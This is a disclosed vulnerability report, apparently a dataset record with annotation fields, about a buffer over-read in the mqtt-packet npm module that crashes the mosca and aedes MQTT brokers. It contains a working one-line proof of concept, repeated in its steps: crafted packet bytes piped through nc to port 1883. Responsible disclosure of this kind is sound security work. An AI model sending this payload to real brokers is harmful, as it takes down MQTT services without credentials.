{
  "reported_to": "Node.js third-party modules",
  "reported_by": "lxndr ",
  "title": "A specifically malformed MQTT Subscribe packet crashes MQTT Brokers using the mqtt-packet module for decoding  ",
  "content": "\nI would like to report a buffer over-read in mqtt-packet respectively BufferList module.\nIt allows triggering an out of range read on a buffer which throws a RangeError. MQTT Brokers like mosca and aedes using this module can be forced to crash by sending a specifically malformed MQTT Subscribe packet.\nModule\nmodule name: mqtt-packet\nversion: 6.1.1\nnpm page: https://www.npmjs.com/package/mqtt-packet\nModule Description\nEncode and Decode MQTT 3.1.1, 5.0 packets the node way.\nModule Stats\n114,635 weekly downloads\nVulnerability\nVulnerability Description\nFrom the original E-Mail to the Author:\nHey Matteo,\nwhile playing around with mosca/aedes and our fuzzing approach from IoT-Testware, I discovered some flaws which cause mosca/aedes to crash. Though, I assume the reasons originate from the mqtt-packet respectively bl modules.\nI didn't open an issue because the issue is IMHO quite critical. One could try to abuse to crash mosca/aedes without requiring any credentials, thus might lead to easy DoS attacks.\nThe malformed Subscribe Packet crashes mosca (v2.8.3) and aedes (v0.37.0), no valid credentials required.\nSteps To Reproduce:\nDetailed steps to reproduce with all required references/steps/commands. If there is any exploit code or reference to the package source code this is the place where it should be put.\nstart either mosca or aedes MQTT Broker\nshoot the following command against the Broker (on localhost)\necho -ne '\\x104\\x00\\x04MQTT\\x04\\xc2\\x00\\xff\\x00\\x19alicedoesnotneedaclientid\\x00\\x05alice\\x00\\x06secret\\x82\\x19\\xa5\\xa6\\x00\\x15hello/topic/of/alice\\x00' | nc localhost 1883\nthe sent byte string contains 2 accumulated MQTT Packets. The second packet is a subscribe packet and is processed in any case and the Broker's Auth mechanisms are undermined.\nPatch\nPlease find a GitHub patch attached.\nSupporting Material/References:\nState all technical information about the stack where the vulnerability was found\nUbuntu 18.04.2 LTS\nnodejs -v v6.17.1\nnpm -v 3.10.10\nWrap up\nI contacted the maintainer to let them know: [Y]\nI opened an issue in the related repository: [N]\nImpact\nAn attacker can harm the availability of MQTT services which are using these modules.\n\n",
  "severity": [
    7.5,
    null
  ],
  "bounty": null,
  "weaknesses": [
    "Buffer Over-read"
  ],
  "screenshots": {},
  "disclosed_date": 1556451360,
  "report_url": "https://hackerone.com/reports/541354",
  "is_multi_component": true,
  "complexity": "HIGH",
  "novelty": "MEDIUM",
  "vuln_category": "IOT",
  "steps": [
    [
      1,
      "Start either mosca or aedes MQTT Broker"
    ],
    [
      2,
      "Send the malformed MQTT Subscribe packet to the Broker using the command: echo -ne '\\x104\\x00\\x04MQTT\\x04\\xc2\\x00\\xff\\x00\\x19alicedoesnotneedaclientid\\x00\\x05alice\\x00\\x06secret\\x82\\x19\\xa5\\xa6\\x00\\x15hello/topic/of/alice\\x00' | nc localhost 1883"
    ]
  ],
  "vuln_description": "A buffer over-read vulnerability in the mqtt-packet module allows triggering an out-of-range read on a buffer, which throws a RangeError. This can crash MQTT Brokers like mosca and aedes when they process a specifically malformed MQTT Subscribe packet, leading to a DoS attack.",
  "reason": "The vulnerability involves understanding the MQTT protocol, the mqtt-packet module's decoding mechanism, and crafting a malformed packet that exploits a buffer over-read. The attack requires knowledge of how the module processes packets and the specific byte sequence that triggers the vulnerability.",
  "new_complexity": "HIGH",
  "requires_code": true,
  "requires_CVE": false,
  "is_ctf": false,
  "other_report": null
}